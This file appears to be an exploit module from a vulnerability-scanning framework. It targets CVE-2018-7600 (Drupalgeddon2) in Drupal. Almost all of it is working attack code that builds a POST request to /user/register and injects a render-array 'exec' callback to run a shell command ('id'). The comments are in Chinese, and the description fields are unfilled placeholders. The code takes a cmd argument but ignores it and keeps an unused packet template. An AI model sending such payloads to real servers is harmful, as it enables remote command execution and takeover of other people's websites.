# CVE-2018-7600.py
# 描述: [待补充]
# 受影响版本: [待补充]
# 参考: [待补充]

import json

def build(ip_port: str, cmd: str):
    """
    构建漏洞利用请求
    
    Args:
        ip_port: 目标IP和端口，格式如 "192.168.1.1:80" 或 "example.com"
        cmd: 要执行的命令
    """
    # 计算命令长度
    cmd_len = len(cmd)
    
    # 构建URL（将host替换为ip_port）
    url = f"http://{ip_port}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    # 原始数据包载荷
    packet_payload = """POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: {ip_port}
Content-Type: application/x-www-form-urlencoded

"form_id": "user_register_form",

"_drupal_ajax": "1",

"mail[#post_render][]": "exec",

"mail[#type]": "markup",

"mail[#markup]": "id"
"""
    
    # 构建请求头
    headers = {
        "Host": ip_port,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    # 构建请求体（如果有）
    data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

    return {
        "method": "POST",
        "url": url,
        "headers": headers,
        "data": data
    }
